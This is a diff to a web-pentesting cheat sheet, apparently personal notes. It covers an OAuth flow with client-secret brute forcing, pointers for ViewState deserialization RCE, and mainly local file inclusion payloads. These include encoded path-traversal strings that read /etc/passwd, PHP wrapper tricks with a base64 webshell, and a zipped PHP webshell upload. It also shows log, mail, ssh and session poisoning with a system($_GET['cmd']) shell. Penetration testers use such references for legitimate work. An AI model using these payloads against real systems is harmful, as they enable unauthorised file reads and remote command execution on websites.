@@ -500,37 +500,30 @@ Content-Type: application/x-www-form-urlencoded
 client_id=\<client_id>&client_secret=\<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code= \<code>
 ```  
 4-
-  
+```  
 {
-  
     "access_token": "<access_token>",
-  
     "token_type": "Bearer",
-  
     "expires_in": 3600,
-  
     "scope": "openid profile"
-  
 }
-  
+```
+
 5-
-  
-GET /userinfo HTTP/1.1
-  
-Host: oauth.server.com
-  
-Authorization: Bearer \<token>
+```  
+GET /userinfo HTTP/1.1  
+Host: oauth.server.com  
+Authorization: Bearer <token>
+```
 
 6- 
-  
+```
 {
-  
     "username":"user",
-  
     "email":"user@ok.com"
-  
 }
-    
+```
+
 ## Padding Oracle Attack
   
 ### Identify
@@ -560,7 +553,7 @@ burp intruder -> payloads.out in file parameter.
   
 ## Insecure - Machine Key for RCE 
 
-https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md   
+https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  
 https://github.com/pwntester/ysoserial.net  
 https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
   
@@ -579,10 +572,10 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 
 #### Replace ../
 
-$language = str_replace('../', '', $_GET['file']);
+$language = str_replace('../', '', $_GET['file']);  
 `/....//....//....//....//etc/passwd`  
 `..././..././..././..././etc/paswd`  
-`....\/....\/....\/....\/etc/passwd`
+`....\/....\/....\/....\/etc/passwd`  
 
 #### Block . and /
 
@@ -590,19 +583,15 @@ $language = str_replace('../', '', $_GET['file']);
 
 /etc/passwd:
 
-`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
-
+`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`  
 `%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`
   
 #### PHP Wrappers
 
-`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
-  
-`expect://id`
-
-`php://filter/read=convert.base64-encode/resource=index.php`
-  
-`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
+`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
+`expect://id`  
+`php://filter/read=convert.base64-encode/resource=index.php`  
+`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`  
 
 #### Filter PHP
 
@@ -610,7 +599,7 @@ $language = str_replace('../', '', $_GET['file']);
 
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
-`./okay/../../../../etc/passwd`
+`./okay/../../../../etc/passwd`  
 
 #### Bypass Extension PHP - Null Bytes
 
@@ -618,7 +607,7 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 -> Removing .php
   
-`https://site.com/index.php?file=index.p.phphp`
+`https://site.com/index.php?file=index.p.phphp`  
   
 #### LFI + File Upload
 
@@ -630,7 +619,7 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 -> Zip
 
 1- 
-`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php`
+`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php`  
 
 2- 
 `http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id`  
@@ -640,34 +629,34 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
  
 -> apache
 
-`nc ip 80`
+`nc ip 80`  
   
-`<?php system($_GET[‘cmd’]); ?>`
+`<?php system($_GET[‘cmd’]); ?>`  
   
 or
   
-`curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'`
+`curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'`  
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
 -> mail
 
-`telnet ip 23`
-`MAIL FROM: email@gmail.com`  
-`RCPT TO: \<?php system($_GET[‘cmd’]); ?>`
-`http://ip/index.php?file=/var/mail/mail.log&cmd=id`
+`telnet ip 23`  
+`MAIL FROM: email@gmail.com`    
+`RCPT TO: \<?php system($_GET[‘cmd’]); ?>`  
+`http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
   
 -> ssh
   
-`ssh \‘<?php system($_GET[‘cmd’]);?>’@ip`
+`ssh \‘<?php system($_GET[‘cmd’]);?>’@ip`  
   
-`http://ip/index.php?file=/var/log/auth.log&cmd=id`
+`http://ip/index.php?file=/var/log/auth.log&cmd=id`  
 
 -> PHP session
 
-`http://ip/index.php?file= \<?php system($_GET["cmd"];?>`
+`http://ip/index.php?file= \<?php system($_GET["cmd"];?>`  
   
-`http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`
+`http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
 /var/log/sshd.log  
